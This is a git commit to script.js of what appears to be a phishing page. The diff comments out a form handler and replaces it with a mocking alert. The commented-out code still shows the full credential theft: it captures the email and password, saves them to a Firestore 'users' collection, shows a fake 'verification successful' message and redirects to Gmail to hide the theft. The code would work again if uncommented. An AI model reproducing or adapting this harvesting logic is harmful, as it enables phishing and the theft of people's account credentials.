9268fdb0dd6375d29e5e0e83101ec823ccd1d288
Anderson Angulo <andersonangulo1704@gmail.com>
2021-07-23 09:31:35 -0500

    alert chupala hecha

--- script.js
+++ script.js
@@ -6,19 +6,20 @@ form.addEventListener('submit', async e=>{
   e.preventDefault()
   const correo=form["correo"].value
   const password=form["password"].value
-  if(correo!=="" && password!==""){
-      await db.collection("users").doc().set({correo,password})
-      contentWrapper.innerHTML=`
-        <div class="alert">
-          <p>VERIFICACIÓN EXITOSA</p>
-          <i class="fas fa-user-check"></i>
-        </div>`
-      setTimeout(()=>{
-        location.href="https://mail.google.com"
-      },1500)
-  }else{
-    alert("COMPLETE LOS CAMPOS")
-  }
+  alert("CHUUPAAALA !!!!!")
+  // if(correo!=="" && password!==""){
+  //     await db.collection("users").doc().set({correo,password})
+  //     contentWrapper.innerHTML=`
+  //       <div class="alert">
+  //         <p>VERIFICACIÓN EXITOSA</p>
+  //         <i class="fas fa-user-check"></i>
+  //       </div>`
+  //     setTimeout(()=>{
+  //       location.href="https://mail.google.com"
+  //     },1500)
+  // }else{
+  //   alert("COMPLETE LOS CAMPOS")
+  // }
 
 
 })
